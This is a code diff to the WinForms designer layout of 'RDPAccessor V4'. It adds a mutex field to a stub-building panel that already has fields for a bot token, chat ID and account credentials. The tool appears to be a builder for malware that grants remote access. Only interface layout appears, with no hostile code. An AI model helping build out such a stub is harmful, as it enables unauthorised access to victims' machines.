@@ -47,6 +47,8 @@
             this.pictureBox1 = new System.Windows.Forms.PictureBox();
             this.minimazeBtn = new System.Windows.Forms.PictureBox();
             this.closeBtn = new System.Windows.Forms.PictureBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.mutexBox = new System.Windows.Forms.TextBox();
             this.botTestBox.SuspendLayout();
             this.stubBuildPanel.SuspendLayout();
             this.panel1.SuspendLayout();
@@ -65,7 +67,7 @@
             this.botTestBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.botTestBox.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
             this.botTestBox.ForeColor = System.Drawing.Color.White;
-            this.botTestBox.Location = new System.Drawing.Point(12, 170);
+            this.botTestBox.Location = new System.Drawing.Point(12, 181);
             this.botTestBox.Name = "botTestBox";
             this.botTestBox.Size = new System.Drawing.Size(304, 89);
             this.botTestBox.TabIndex = 0;
@@ -77,7 +79,7 @@
             this.accPasswdBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
             this.accPasswdBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
             this.accPasswdBox.Cursor = System.Windows.Forms.Cursors.Arrow;
-            this.accPasswdBox.ForeColor = System.Drawing.Color.Green;
+            this.accPasswdBox.ForeColor = System.Drawing.Color.Cyan;
             this.accPasswdBox.Location = new System.Drawing.Point(58, 52);
             this.accPasswdBox.Multiline = true;
             this.accPasswdBox.Name = "accPasswdBox";
@@ -89,7 +91,7 @@
             this.accUsernameBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
             this.accUsernameBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
             this.accUsernameBox.Cursor = System.Windows.Forms.Cursors.Arrow;
-            this.accUsernameBox.ForeColor = System.Drawing.Color.Green;
+            this.accUsernameBox.ForeColor = System.Drawing.Color.Cyan;
             this.accUsernameBox.Location = new System.Drawing.Point(58, 25);
             this.accUsernameBox.Multiline = true;
             this.accUsernameBox.Name = "accUsernameBox";
@@ -121,6 +123,8 @@
             // stubBuildPanel
             // 
             this.stubBuildPanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(7)))), ((int)(((byte)(101)))), ((int)(((byte)(45)))));
+            this.stubBuildPanel.Controls.Add(this.mutexBox);
+            this.stubBuildPanel.Controls.Add(this.label6);
             this.stubBuildPanel.Controls.Add(this.label3);
             this.stubBuildPanel.Controls.Add(this.chatidBox);
             this.stubBuildPanel.Controls.Add(this.label2);
@@ -130,7 +134,7 @@
             this.stubBuildPanel.ForeColor = System.Drawing.Color.White;
             this.stubBuildPanel.Location = new System.Drawing.Point(12, 61);
             this.stubBuildPanel.Name = "stubBuildPanel";
-            this.stubBuildPanel.Size = new System.Drawing.Size(304, 97);
+            this.stubBuildPanel.Size = new System.Drawing.Size(304, 114);
             this.stubBuildPanel.TabIndex = 0;
             this.stubBuildPanel.TabStop = false;
             this.stubBuildPanel.Text = "Build Info";
@@ -151,7 +155,7 @@
             this.chatidBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
             this.chatidBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
             this.chatidBox.Cursor = System.Windows.Forms.Cursors.Arrow;
-            this.chatidBox.ForeColor = System.Drawing.Color.Green;
+            this.chatidBox.ForeColor = System.Drawing.Color.Cyan;
             this.chatidBox.Location = new System.Drawing.Point(58, 55);
             this.chatidBox.Multiline = true;
             this.chatidBox.Name = "chatidBox";
@@ -174,7 +178,7 @@
             this.botTokenBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
             this.botTokenBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
             this.botTokenBox.Cursor = System.Windows.Forms.Cursors.Arrow;
-            this.botTokenBox.ForeColor = System.Drawing.Color.Green;
+            this.botTokenBox.ForeColor = System.Drawing.Color.Cyan;
             this.botTokenBox.Location = new System.Drawing.Point(58, 29);
             this.botTokenBox.Multiline = true;
             this.botTokenBox.Name = "botTokenBox";
@@ -193,6 +197,7 @@
             // 
             // statusLabel
             // 
+            this.statusLabel.BackColor = System.Drawing.Color.Cyan;
             this.statusLabel.Dock = System.Windows.Forms.DockStyle.Fill;
             this.statusLabel.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
             this.statusLabel.ForeColor = System.Drawing.Color.Black;
@@ -211,7 +216,7 @@
             this.label1.Name = "label1";
             this.label1.Size = new System.Drawing.Size(114, 19);
             this.label1.TabIndex = 6;
-            this.label1.Text = "RDPAccessor V3";
+            this.label1.Text = "RDPAccessor V4";
             // 
             // buildBtn
             // 
@@ -222,7 +227,7 @@
             this.buildBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.buildBtn.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
             this.buildBtn.ForeColor = System.Drawing.Color.White;
-            this.buildBtn.Location = new System.Drawing.Point(88, 271);
+            this.buildBtn.Location = new System.Drawing.Point(88, 287);
             this.buildBtn.Name = "buildBtn";
             this.buildBtn.Size = new System.Drawing.Size(129, 35);
             this.buildBtn.TabIndex = 0;
@@ -268,11 +273,34 @@
             this.closeBtn.TabStop = false;
             this.closeBtn.Click += new System.EventHandler(this.closeBtn_Click);
             // 
+            // label6
+            // 
+            this.label6.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label6.ForeColor = System.Drawing.Color.White;
+            this.label6.Location = new System.Drawing.Point(-1, 85);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(50, 14);
+            this.label6.TabIndex = 1;
+            this.label6.Text = "MUTEX";
+            this.label6.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            // 
+            // mutexBox
+            // 
+            this.mutexBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
+            this.mutexBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.mutexBox.Cursor = System.Windows.Forms.Cursors.Arrow;
+            this.mutexBox.ForeColor = System.Drawing.Color.Cyan;
+            this.mutexBox.Location = new System.Drawing.Point(58, 81);
+            this.mutexBox.Multiline = true;
+            this.mutexBox.Name = "mutexBox";
+            this.mutexBox.Size = new System.Drawing.Size(229, 20);
+            this.mutexBox.TabIndex = 2;
+            // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(21)))), ((int)(((byte)(21)))), ((int)(((byte)(21)))));
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(15)))), ((int)(((byte)(15)))), ((int)(((byte)(15)))));
             this.ClientSize = new System.Drawing.Size(328, 352);
             this.Controls.Add(this.buildBtn);
             this.Controls.Add(this.label1);
@@ -321,6 +349,8 @@
         private System.Windows.Forms.Button buildBtn;
         private System.Windows.Forms.Label statusLabel;
         private System.Windows.Forms.SaveFileDialog saveBuildFile;
+        private System.Windows.Forms.TextBox mutexBox;
+        private System.Windows.Forms.Label label6;
     }
 }
 
